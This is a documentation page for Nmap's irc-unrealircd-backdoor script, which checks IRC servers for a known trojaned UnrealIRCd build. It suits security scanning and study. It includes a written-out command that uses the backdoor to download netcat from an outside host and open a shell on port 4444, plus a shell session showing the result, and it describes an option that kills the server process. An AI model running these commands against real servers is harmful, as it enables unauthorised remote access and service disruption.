---
title: "irc-unrealircd-backdoor"
source: official
category: "Exploit"
categories:
  - "exploit"
  - "intrusive"
  - "malware"
  - "vuln"
shortDescription: "Checks if an IRC server is backdoored by running a time-based command (ping)\nand checking how long it takes to respond."
risk: intrusive
tags:
  - "exploit"
  - "intrusive"
  - "malware"
  - "vuln"
  - "portrule"
scriptTypes:
  - "portrule"
protocols: []
ports: []
usage: "nmap -sV --script=irc-unrealircd-backdoor <target>"
outputPreview:
  - "PORT     STATE SERVICE"
  - "6667/tcp open  irc"
  - "|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"
author: "Nmap Project"
reference:
  label: "View Official Script Source"
  url: "https://svn.nmap.org/nmap/scripts/irc-unrealircd-backdoor.nse"
documentationUrl: "https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html"
---

Checks if an IRC server is backdoored by running a time-based command (ping)
and checking how long it takes to respond.
The irc-unrealircd-backdoor.command script argument can be used to
run an arbitrary command on the remote system. Because of the nature of
this vulnerability (the output is never returned) we have no way of
getting the output of the command. It can, however, be used to start a
netcat listener as demonstrated here:
 $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
 $ ncat -vv localhost 4444
 Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )
 Ncat: Connected to 127.0.0.1:4444.
 pwd
 /home/ron/downloads/Unreal3.2-bad
 whoami
 ron

Metasploit can also be used to exploit this vulnerability.
In addition to running arbitrary commands, the
 irc-unrealircd-backdoor.kill script argument can be passed, which
simply kills the UnrealIRCd process.
